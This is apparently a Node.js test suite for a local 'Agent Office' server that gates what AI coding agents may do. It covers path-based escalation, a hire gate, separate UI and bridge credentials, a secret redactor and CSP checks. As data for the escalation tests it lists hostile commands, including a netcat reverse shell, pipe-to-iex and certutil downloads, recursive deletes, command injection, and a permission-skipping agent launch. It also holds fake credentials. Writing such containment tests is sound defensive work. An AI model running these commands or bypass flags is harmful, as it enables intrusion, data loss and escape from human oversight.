import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import http from 'node:http';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { review, flat, isMemoryNote, WEB_ALLOW } from './manager.mjs';
import { redact, hasSecret, redactDeep, entropy } from './redact.mjs';
import { safeEqual, parseCookies, createAuth, loadBridgeKey, safeLocal } from './auth.mjs';
import { hireGate, promptHash, narrowTools, teamFromSops, ROSTER } from './company.mjs';
import { agentVault, seedMemory } from './vault.mjs';

const HOME = 'C:\\Users\\Alex';
const CTX = { home: HOME, protectedDirs: ['C:\\Program Files\\App', 'D:\\Vault\\Agent Office\\SOPs'], trustedDirs: ['C:\\work\\project'] };
const ok = (tool, input, ctx = CTX) => review(tool, input, ctx).ok === true;
const escalates = (tool, input, ctx = CTX) => review(tool, input, ctx).ok === false;

// ---------------------------------------------------------------- path normalisation
test('flat: case, slashes, doubled backslashes, ~, env vars and dot segments all collapse', () => {
  const want = 'c:/users/alex/.claude/agent-office/bridge.json';
  for (const p of ['C:\\Users\\Alex\\.claude\\agent-office\\bridge.json', 'C:\\\\Users\\\\Alex\\\\.claude\\\\agent-office\\\\bridge.json', 'c:/USERS/alex/.CLAUDE/agent-office/BRIDGE.json',
    '~/.claude/agent-office/bridge.json', '%USERPROFILE%\\.claude\\agent-office\\bridge.json', '$env:USERPROFILE\\.claude\\agent-office\\bridge.json',
    'C:/Users/Alex/x/../.claude/./agent-office/bridge.json', '$HOME/.claude/agent-office/bridge.json']) {
    assert.equal(flat(p, HOME), want, p);
  }
});

test('anything touching ~/.claude, startup, profiles or the app is escalated in every spelling', () => {
  const spellings = ['C:\\Users\\Alex\\.claude\\agent-office\\goals.json', 'C:\\\\Users\\\\Alex\\\\.claude\\\\settings.json', '~/.CLAUDE/settings.local.json', '$env:USERPROFILE\\.claude\\agent-office\\kiro.json', 'C:/Users/Alex/foo/../.claude/x.json'];
  for (const p of spellings) {
    assert.ok(escalates('Read', { file_path: p }), 'Read ' + p);
    assert.ok(escalates('Write', { file_path: p, content: 'x' }), 'Write ' + p);
    assert.ok(escalates('Bash', { command: 'cat ' + p }), 'cat ' + p);
    assert.ok(escalates('PowerShell', { command: 'Get-Content "' + p + '"' }), 'Get-Content ' + p);
  }
  assert.ok(escalates('Write', { file_path: 'C:\\Users\\Alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat', content: 'x' }));
  assert.ok(escalates('Write', { file_path: 'C:\\Users\\Alex\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1', content: 'x' }));
  assert.ok(escalates('Bash', { command: 'echo hi >> $PROFILE' }));
  assert.ok(escalates('Write', { file_path: 'C:\\Users\\Alex\\AppData\\Local\\Programs\\Agent Office\\resources\\app\\server.mjs', content: 'x' }));
  assert.ok(escalates('Edit', { file_path: 'C:\\Program Files\\App\\main.js' }), 'protectedDirs');
  assert.ok(escalates('Write', { file_path: 'D:\\Vault\\Agent Office\\SOPs\\specialist-forge.md', content: 'x' }), 'SOP folder');
  assert.ok(escalates('Bash', { command: 'cat C:\\Users\\Alex\\.cl*\\settings.json' }), 'wildcard around .claude');
});

test('a specialist may write only its own memory notes under ~/.claude', () => {
  const note = k => `${HOME}\\.claude\\agent-office\\agents\\tiro\\${k}\\memory\\lesson-1.md`;
  assert.ok(isMemoryNote(note('forge'), HOME));
  assert.ok(ok('Write', { file_path: note('forge'), content: 'x' }));
  assert.ok(ok('Edit', { file_path: note('scribe') }));
  for (const bad of [`${HOME}\\.claude\\agent-office\\agents\\tiro\\memory\\scheduler-inbox.md`, `${HOME}\\.claude\\agent-office\\agents\\tiro\\ghost\\memory\\a.md`,
    `${HOME}\\.claude\\agent-office\\agents\\tiro\\forge\\memory\\..\\..\\..\\goals.json`, `${HOME}\\.claude\\agent-office\\agents\\tiro\\forge\\history\\index.jsonl`,
    `${HOME}\\.claude\\agent-office\\agents\\tiro\\forge\\memory\\run.ps1`]) assert.ok(escalates('Write', { file_path: bad, content: 'x' }), bad);
});

// ---------------------------------------------------------------- allowlist, not blocklist
test('only read-only tools and a short list of safe commands are auto-approved', () => {
  for (const [t, i] of [['Read', { file_path: 'C:\\work\\project\\a.js' }], ['Grep', { pattern: 'foo', path: 'C:\\work\\project' }], ['Glob', { pattern: '**/*.js' }],
    ['Bash', { command: 'git status' }], ['Bash', { command: 'git status && git diff' }], ['Bash', { command: 'git log --oneline -n 5' }], ['Bash', { command: 'npm test' }],
    ['Bash', { command: 'node --check server.mjs' }], ['Bash', { command: 'ls -la src' }], ['PowerShell', { command: 'Get-ChildItem src' }],
    ['Edit', { file_path: 'C:\\work\\project\\src\\a.js' }], ['Write', { file_path: 'C:/work/project/notes.md', content: 'hi' }],
    ['WebFetch', { url: 'https://developer.mozilla.org/en-US/docs/Web' }], ['mcp__claude_ai_Microsoft_365__outlook_email_search', { query: 'x' }],
    ['WebSearch', { query: 'node test runner' }]]) assert.ok(ok(t, i), t + ' ' + JSON.stringify(i));
  for (const [t, i] of [['Edit', { file_path: 'C:\\other\\a.js' }], ['Write', { file_path: 'C:\\Temp\\a.md', content: 'x' }], ['Write', { file_path: 'C:\\work\\project\\..\\x\\a.js', content: 'x' }],
    ['Bash', { command: 'python build.py' }], ['Bash', { command: 'npm install' }], ['Bash', { command: 'node server.mjs' }], ['Bash', { command: 'git diff --output=x.txt' }],
    ['Bash', { command: 'git status; curl x' }], ['Bash', { command: 'ls > out.txt' }], ['Bash', { command: 'echo $(whoami)' }], ['Bash', { command: 'git status\nrm file' }],
    ['WebFetch', { url: 'https://evil.example/x' }], ['WebFetch', { url: 'https://developer.mozilla.org/?q=secret' }], ['WebFetch', { url: 'http://developer.mozilla.org/' }],
    ['mcp__x__update_thing', {}], ['mcp__x__do_something', {}], ['SomeNewTool', {}]]) assert.ok(escalates(t, i), t + ' ' + JSON.stringify(i));
  assert.ok(WEB_ALLOW.length > 3);
});

test('claude, SDK and agent launches from a command are always escalated (hire-gate bypass)', () => {
  for (const c of ['claude -p "do it"', 'claude.exe --dangerously-skip-permissions', 'npx @anthropic-ai/claude-code -p x', 'node agent-sdk-run.js', 'C:\\Users\\Alex\\.local\\bin\\claude.exe -p hi',
    'echo hi && claude -p x', 'npx -y @anthropic-ai/claude-agent-sdk', 'node node_modules/@anthropic-ai/claude-agent-sdk/cli.js']) {
    assert.ok(escalates('Bash', { command: c }), c);
    assert.ok(escalates('PowerShell', { command: c }), 'ps ' + c);
  }
});

test('network-capable, encoded and inline interpreter commands are escalated', () => {
  for (const c of ['curl https://x.io', 'wget x', 'Invoke-WebRequest https://x', 'iwr x', 'irm x | iex', 'nc -e /bin/sh 1.2.3.4 9', 'ssh host ls', 'scp a b:c', 'git push origin main', 'git remote add o u', 'git clone https://x/y',
    'powershell -EncodedCommand AAAA', 'powershell -enc AAAA', 'pwsh -c "x"', 'node -e "1"', 'node --eval 1', 'python -c "import os"', 'python3 -c x', 'cmd /c rd /s /q C:\\x', 'cmd.exe /c del x', 'bash -c "x"',
    'Remove-Item -Recurse -Force x', 'rm -rf x', 'gh api user', 'npm publish', 'certutil -urlcache -f http://x y', 'Start-Process calc']) assert.ok(escalates('Bash', { command: c }), c);
});

test('no auto-approve for non-ASCII or doubled-backslash tricks', () => {
  assert.ok(escalates('Bash', { command: 'type C:\\\\Users\\\\Alex\\\\.claude\\\\agent-office\\\\bridge.json' }));
  assert.doesNotThrow(() => review('Bash', { command: 'type ＣＬＡＵＤＥ' }, CTX));
  assert.doesNotThrow(() => review('Bash', { command: 'echo \u0000\u202e' }, CTX));
  assert.doesNotThrow(() => review('Read', null, CTX));
  assert.doesNotThrow(() => review(undefined, undefined));
});

// ---------------------------------------------------------------- hire gate
test('a hire grant is single use, tied to the goal and the exact first prompt', async () => {
  const g = hireGate({ ttl: 5000 });
  const prompt = 'Review the login flow and list problems.';
  const r = g.request({ key: 'warden', goalId: 'g123abc', promptHash: promptHash(prompt) });
  g.decide(r.id, true);
  assert.equal(g.check('warden', 'Do something else entirely').ok, false, 'different prompt refused');
  assert.equal(g.check('warden', 'Do something else entirely').why, 'prompt differs from the approved one');
  assert.equal(g.check('forge', prompt).ok, false, 'different specialist refused');
  assert.equal(g.check('warden', '  ' + prompt + '\r\n').ok, true, 'whitespace and line endings do not matter');
  assert.equal(g.check('warden', prompt).goalId, 'g123abc');
  assert.equal(g.consume('warden', prompt), true);
  assert.equal(g.consume('warden', prompt), false, 'single use');
  assert.equal(g.check('researcher', prompt).ok, false, 'old alias maps to cabalan, not warden');
});

test('read-only roles have no shell; probe keeps one for tests', () => {
  for (const k of ['warden', 'atlas', 'cabalan']) assert.ok(!ROSTER[k].tools.includes('Bash'), k);
  assert.ok(ROSTER.probe.tools.includes('Bash'));
  for (const k of ['warden', 'probe', 'atlas', 'cabalan']) assert.ok(!ROSTER[k].tools.some(t => ['Write', 'Edit'].includes(t)), k + ' stays read-only');
});

test('SOP tools frontmatter can only narrow the built-in list', () => {
  assert.deepEqual(narrowTools('Read, Grep', ['Read', 'Grep', 'Glob']), ['Read', 'Grep']);
  assert.deepEqual(narrowTools('Read, Bash, Write', ['Read', 'Grep']), ['Read'], 'added tools are dropped');
  assert.deepEqual(narrowTools('Bash, Write', ['Read', 'Grep']), ['Read', 'Grep'], 'nothing valid left: keep the built-in list');
  assert.deepEqual(narrowTools('', ['Read']), ['Read']);
  const team = teamFromSops([{ name: 'specialist-warden', text: '---\ntools: Read, Bash, Edit\n---\nAudit things.' }]);
  assert.ok(!team.warden.tools.includes('Bash') && !team.warden.tools.includes('Edit'));
});

// ---------------------------------------------------------------- credentials
test('safeEqual never throws and never matches different or non-ASCII input', () => {
  assert.equal(safeEqual('abc', 'abc'), true);
  assert.equal(safeEqual('abc', 'abd'), false);
  assert.equal(safeEqual('abc', 'abcd'), false);
  assert.equal(safeEqual('\u00e9\u4e2d\u6587', '\u00e9\u4e2d\u6587'), true);
  assert.equal(safeEqual('\u00e9\u4e2d\u6587', 'xxxxxxxx'), false);
  assert.equal(safeEqual(undefined, ''), true);
  assert.equal(safeEqual('', 'x'), false);
});

test('auth: bridge key and UI key are separate; nonce and bootstrap work once', () => {
  let t = 1000;
  const a = createAuth({ bridgeKey: 'B'.repeat(48), uiKey: 'U'.repeat(48), bootToken: 'boot123', now: () => t });
  const req = h => ({ headers: h });
  assert.equal(a.isBridge(req({ 'x-key': 'B'.repeat(48) })), true);
  assert.equal(a.isUi(req({ 'x-key': 'B'.repeat(48) })), false, 'the bridge key is not a UI credential');
  assert.equal(a.isUi(req({ cookie: 'x=1; ao_ui=' + 'U'.repeat(48) })), true);
  assert.equal(a.isUi(req({ cookie: 'ao_ui=' + 'B'.repeat(48) })), false);
  assert.equal(a.isBridge(req({ cookie: 'ao_ui=' + 'U'.repeat(48) })), false, 'the UI cookie is not a bridge key');
  assert.equal(a.isBridge(req({ 'x-key': '\u00e9\u4e2d' })), false);
  assert.equal(a.isUi(req({ cookie: 'ao_ui=%E4%B8%AD' })), false);
  assert.equal(a.nonceOk(req({ 'x-nonce': a.nonce })), true);
  assert.equal(a.nonceOk(req({ 'x-nonce': 'nope' })), false);
  assert.equal(a.nonceOk(req({})), false);
  assert.equal(a.redeemBoot('wrong'), false);
  assert.equal(a.redeemBoot('boot123'), true);
  assert.equal(a.redeemBoot('boot123'), false, 'one time');
  const b = createAuth({ bridgeKey: 'x', bootToken: 'z', now: () => t });
  t += 6 * 60e3;
  assert.equal(b.redeemBoot('z'), false, 'expired');
  assert.match(a.uiCookie(), /HttpOnly; SameSite=Strict/);
  assert.deepEqual(parseCookies('a=1; b=%20x; a=2'), { a: '1', b: ' x' });
  assert.equal(safeLocal('//evil.com'), '/');
  assert.equal(safeLocal('https://evil.com'), '/');
  assert.equal(safeLocal('/island'), '/island');
});

test('bridge.json keeps only the bridge key and is rotated once when it predates key separation', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ao-auth-')), f = path.join(dir, 'bridge.json');
  fs.writeFileSync(f, JSON.stringify({ port: 1, key: 'old'.repeat(16) }));
  const first = loadBridgeKey(f, 4777);
  assert.equal(first.rotated, true);
  assert.notEqual(first.key, 'old'.repeat(16));
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(f, 'utf8'))).sort(), ['key', 'port', 'v']);
  const again = loadBridgeKey(f, 4777);
  assert.equal(again.rotated, false);
  assert.equal(again.key, first.key);
  if (process.platform !== 'win32') assert.equal(fs.statSync(f).mode & 0o777, 0o600);
});

// ---------------------------------------------------------------- redactor
test('redactor: provider keys, JWT, connection strings, bearer, high-entropy tokens and key blocks', () => {
  const secrets = ['dop_v1_' + 'a1b2c3d4'.repeat(8), 'ops_' + 'eyJabcDEF0123456789'.repeat(2), 'AKIAIOSFODNN7EXAMPLE', 'sk-ant-api03-' + 'Zx9'.repeat(10), 'ghp_' + 'A1b2C3d4E5'.repeat(4),
    'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk', 'postgres://admin:s3cretPass@db.example.com:5432/app',
    'DefaultEndpointsProtocol=https;AccountName=x;AccountKey=' + 'Ab1+'.repeat(16) + '==', 'Authorization: Bearer abcdefghijklmnopqrstuv', 'password=hunter2', 'API_KEY: abcd1234', 'token = "xyz-123456"',
    'Zq8Lm2Xv9Rt4Yb7Nc1Wd6Kp3Hs5Jf0GaE', '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----'];
  for (const s of secrets) { const r = redact('before ' + s + ' after'); assert.match(r, /\[redacted\]/, s); assert.ok(hasSecret(s), s); }
  assert.equal(redact('x -----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY----- y'), 'x [redacted] y');
});

test('redactor: ordinary text, hashes and paths are left alone', () => {
  for (const s of ['Review the password management policy and token usage', 'commit 9f80ec17be0ca66644465e952310273b7e256025d736f9f462ed03f39e36d665', 'C:/Users/me/projects/app/src/components/Button.tsx',
    'See docs/GUIDE.md and the changelog', 'Tests pass (117/117) in 1.8s', 'src/lib/some/long/path/to/a/file-name.test.mjs']) assert.equal(redact(s), s, s);
  assert.ok(entropy('aaaaaaaa') < 1);
  assert.deepEqual(redactDeep({ a: 'password=hunter2', b: ['ok', 'token: abcd1234'], c: 3 }), { a: '[redacted]', b: ['ok', '[redacted]'], c: 3 });
});

test('seedMemory scrubs secrets before copying and reports how many notes it changed', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ao-seed-')), mem = path.join(tmp, 'claude-memory');
  fs.mkdirSync(mem);
  fs.writeFileSync(path.join(mem, 'a-note.md'), '---\nname: a-note\ndescription: db access\ntype: reference\n---\nUse password=hunter22 on the box.\n');
  fs.writeFileSync(path.join(mem, 'b-note.md'), '---\nname: b-note\ndescription: plain\ntype: note\n---\nNothing secret here.\n');
  const v = agentVault(path.join(tmp, 'vault'));
  const r = seedMemory(v, mem, redact);
  assert.deepEqual(r, { copied: 2, scrubbed: 1 });
  assert.doesNotMatch(v.read('a-note'), /hunter22/);
  assert.match(v.read('b-note'), /Nothing secret here/);
});

// ---------------------------------------------------------------- the real server
function startServer() {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ao-srv-')), port = 47000 + Math.floor(Math.random() * 900);
  const uiKey = crypto.randomBytes(24).toString('hex');
  const child = spawn(process.execPath, [fileURLToPath(new URL('./server.mjs', import.meta.url))], {
    env: { ...process.env, USERPROFILE: tmp, HOME: tmp, AGENT_OFFICE_PORT: String(port), AGENT_OFFICE_UI_KEY: uiKey, CLAUDE_CODE_PATH: '' }, stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
  let out = '';
  child.stdout.on('data', d => { out += d; }); child.stderr.on('data', d => { out += d; });
  return new Promise((resolve, reject) => {
    const t0 = Date.now();
    const tick = () => { if (/running on/.test(out)) return resolve({ child, port, tmp, uiKey, log: () => out }); if (Date.now() - t0 > 20000) { child.kill(); return reject(new Error('server did not start: ' + out.slice(0, 400))); } setTimeout(tick, 150); };
    tick();
  });
}
const call = (port, p, { method = 'POST', headers = {}, body } = {}) => new Promise((resolve, reject) => {
  const req = http.request({ host: '127.0.0.1', port, path: p, method, headers: { host: `127.0.0.1:${port}`, 'content-type': 'application/json', ...headers } }, res => {
    let d = ''; res.on('data', c => { d += c; }); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: d }));
  });
  req.on('error', reject); req.end(body === undefined ? (method === 'POST' ? '{}' : undefined) : JSON.stringify(body));
});

test('server: credentials are separated, decisions need the UI cookie and nonce, nothing leaks', { timeout: 60000 }, async t => {
  const s = await startServer();
  t.after(() => { try { s.child.kill(); } catch {} });
  const bridge = JSON.parse(fs.readFileSync(path.join(s.tmp, '.claude', 'agent-office', 'bridge.json'), 'utf8'));
  assert.deepEqual(Object.keys(bridge).sort(), ['key', 'port', 'v']);
  assert.notEqual(bridge.key, s.uiKey);
  const ui = { cookie: 'ao_ui=' + s.uiKey };

  assert.equal((await call(s.port, '/api/roster')).status, 401, 'no credential');
  assert.equal((await call(s.port, '/api/roster', { headers: { 'x-key': bridge.key } })).status, 401, 'bridge key does not open the API');
  assert.equal((await call(s.port, '/api/roster?key=' + s.uiKey)).status, 401, '?key= is no longer accepted');
  assert.equal((await call(s.port, '/api/roster', { headers: { 'x-key': s.uiKey } })).status, 401, 'the UI key in a header is not accepted either');
  assert.equal((await call(s.port, '/api/roster', { headers: ui })).status, 200, 'UI cookie works');
  assert.equal((await call(s.port, '/api/roster', { headers: { 'x-key': Buffer.from('\u00e9\u4e2d\u6587\u{1F600}', 'utf8').toString('latin1') } })).status, 401, 'non-ASCII key: 401, no crash');
  assert.equal((await call(s.port, '/api/roster', { headers: { cookie: 'ao_ui=%E4%B8%AD' } })).status, 401);

  // an agent with the bridge key (readable in bridge.json) cannot approve anything
  for (const p of ['/api/decide', '/api/hire/decide', '/api/switch', '/api/manager', '/api/send']) {
    assert.equal((await call(s.port, p, { headers: { 'x-key': bridge.key }, body: { askId: 'x', decision: 'allow', id: 'x', approve: true, name: 'hiring', on: false } })).status, 401, p + ' with the bridge key');
    assert.equal((await call(s.port, p, { headers: ui, body: { id: 'x' } })).status, 403, p + ' with the cookie but no nonce');
  }
  const nonceCookie = (await call(s.port, '/', { method: 'GET', headers: ui })).headers['set-cookie'].join(';');
  const nonce = nonceCookie.match(/ao_nonce=([0-9a-f]+)/)[1];
  assert.equal((await call(s.port, '/api/hire/decide', { headers: { ...ui, 'x-nonce': nonce }, body: { id: 'nope', approve: true } })).status, 404, 'with cookie and nonce the request is processed');
  assert.equal((await call(s.port, '/', { method: 'GET' })).headers['set-cookie'], undefined, 'no nonce for an anonymous page load');

  // the bridge key opens /bridge/* only
  assert.equal((await call(s.port, '/bridge/poll?session=x', { method: 'GET', headers: { 'x-key': bridge.key } })).status, 200);
  assert.equal((await call(s.port, '/bridge/poll?session=x', { method: 'GET', headers: ui })).status, 401, 'the UI cookie is not a bridge key');
  assert.equal((await call(s.port, '/bridge/poll?session=x', { method: 'GET' })).status, 401);

  // bad input: a clean error, no path or stack in the message
  const bad = await call(s.port, '/api/names/set', { headers: { ...ui, 'x-nonce': nonce }, body: { key: 'ghost', name: 'Zed' } });
  assert.ok(bad.status >= 400 && !/[\\/]/.test(bad.body), bad.body);
  const raw = await new Promise(res => { const r = http.request({ host: '127.0.0.1', port: s.port, path: '/api/goal', method: 'POST', headers: { host: `127.0.0.1:${s.port}`, ...ui, 'x-nonce': nonce } }, x => { let d = ''; x.on('data', c => { d += c; }); x.on('end', () => res({ status: x.statusCode, body: d })); }); r.end('{not json'); });
  assert.equal(raw.status, 400);
  assert.doesNotMatch(raw.body, /Unexpected|position|JSON/);

  // keys never appear in the server log; the config folder is private
  assert.ok(!s.log().includes(bridge.key) && !s.log().includes(s.uiKey), 'no key in the log');
  assert.doesNotMatch(s.log(), /[?&]key=/);
  const rack = JSON.parse((await call(s.port, '/api/rack', { headers: ui })).body);
  assert.ok(!JSON.stringify(rack).includes(bridge.key) && !JSON.stringify(rack).includes(s.uiKey), 'no key in the rack log');
  if (process.platform !== 'win32') assert.equal(fs.statSync(path.join(s.tmp, '.claude', 'agent-office')).mode & 0o777, 0o700);
  // survives an uncaught error probe: still answering
  assert.equal((await call(s.port, '/api/roster', { headers: ui })).status, 200);
});

test('server: standalone bootstrap URL signs in once, then the key is not in the URL', { timeout: 60000 }, async t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ao-boot-')), port = 47900 + Math.floor(Math.random() * 90);
  const child = spawn(process.execPath, [fileURLToPath(new URL('./server.mjs', import.meta.url))], { env: { ...process.env, USERPROFILE: tmp, HOME: tmp, AGENT_OFFICE_PORT: String(port), AGENT_OFFICE_UI_KEY: '', CLAUDE_CODE_PATH: '' }, stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
  t.after(() => { try { child.kill(); } catch {} });
  let out = ''; child.stdout.on('data', d => { out += d; }); child.stderr.on('data', d => { out += d; });
  const t0 = Date.now(); while (!/__boot\?t=/.test(out) && Date.now() - t0 < 20000) await new Promise(r => setTimeout(r, 150));
  const boot = out.match(/__boot\?t=([0-9a-f]+)&to=\//)[1];
  const r1 = await call(port, `/__boot?t=${boot}&to=/island`, { method: 'GET' });
  assert.equal(r1.status, 302); assert.equal(r1.headers.location, '/island');
  assert.match(r1.headers['set-cookie'].join(';'), /ao_ui=[0-9a-f]+; HttpOnly; SameSite=Strict/);
  assert.equal((await call(port, `/__boot?t=${boot}&to=/`, { method: 'GET' })).status, 401, 'the bootstrap link works once');
  const cookie = r1.headers['set-cookie'].find(c => c.startsWith('ao_ui=')).split(';')[0];
  assert.equal((await call(port, '/api/roster', { headers: { cookie } })).status, 200);
});

// ---------------------------------------------------------------- retention, scheduler fencing
import { prune, days } from './retention.mjs';
test('retention: off by default, deletes only old history, reports and finished goals when set', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ao-ret-')), hist = path.join(tmp, 'agents', 'tiro', 'forge', 'history'), rep = path.join(tmp, 'Reports');
  fs.mkdirSync(hist, { recursive: true }); fs.mkdirSync(rep);
  const old = Date.now() - 40 * 86400e3, mk = (f, t) => { fs.writeFileSync(f, 'x'); fs.utimesSync(f, new Date(t), new Date(t)); };
  mk(path.join(hist, 'old.md'), old); mk(path.join(hist, 'new.md'), Date.now()); mk(path.join(hist, 'index.jsonl'), old); mk(path.join(rep, 'r-old.md'), old);
  const goalsFile = path.join(tmp, 'goals.json');
  fs.writeFileSync(goalsFile, JSON.stringify({ date: 'x', goals: [{ id: 'g1', status: 'done', at: old }, { id: 'g2', status: 'todo', at: old }, { id: 'g3', status: 'done', at: Date.now() }] }));
  const args = { agentsRoot: path.join(tmp, 'agents', 'tiro'), reportsDir: rep, goalsFile };
  assert.equal(prune({ ...args, retentionDays: 0 }).removed, 0, 'off by default');
  assert.equal(prune({ ...args, retentionDays: 3 }).removed, 0, 'under 7 days is ignored');
  assert.equal(days('30'), 30);
  const r = prune({ ...args, retentionDays: 30 });
  assert.equal(r.removed, 2); assert.equal(r.goals, 1);
  assert.ok(!fs.existsSync(path.join(hist, 'old.md')) && fs.existsSync(path.join(hist, 'new.md')) && fs.existsSync(path.join(hist, 'index.jsonl')) && !fs.existsSync(path.join(rep, 'r-old.md')));
  assert.deepEqual(JSON.parse(fs.readFileSync(goalsFile, 'utf8')).goals.map(g => g.id), ['g2', 'g3']);
});

test('scheduler subjects are never written into Tiro memory and the tool that shows them is fenced', () => {
  const job = fs.readFileSync(new URL('./scheduler-job.mjs', import.meta.url), 'utf8').split('\n').filter(l => !l.trim().startsWith('//')).join('\n');
  assert.doesNotMatch(job, /MEMORY\.md|scheduler-inbox|agents['"]/);
  const srv = fs.readFileSync(new URL('./server.mjs', import.meta.url), 'utf8');
  assert.match(srv, /scheduler_inbox/); assert.match(srv, /UNTRUSTED_EMAIL_SUBJECTS/);
});

test('pages load no remote resources: CSP has no remote host and the fonts are vendored', () => {
  const srv = fs.readFileSync(new URL('./server.mjs', import.meta.url), 'utf8');
  const csp = srv.match(/'content-security-policy': "([^"]+)"/)[1];
  assert.doesNotMatch(csp, /https?:\/\//);
  for (const f of ['Agent Office.html', 'kiro.html', 'island.html']) assert.doesNotMatch(fs.readFileSync(new URL('./public/' + f, import.meta.url), 'utf8'), /fonts\.(googleapis|gstatic)\.com/, f);
  assert.ok(fs.existsSync(new URL('./public/fonts/fonts.css', import.meta.url)));
  for (const f of ['pixelifysans', 'ibmplexmono', 'instrumentsans']) assert.ok(fs.existsSync(new URL('./public/fonts/OFL-' + f + '.txt', import.meta.url)), 'licence text for ' + f);
  assert.match(fs.readFileSync(new URL('./THIRD_PARTY_NOTICES.md', import.meta.url), 'utf8'), /Open Font License/);
});
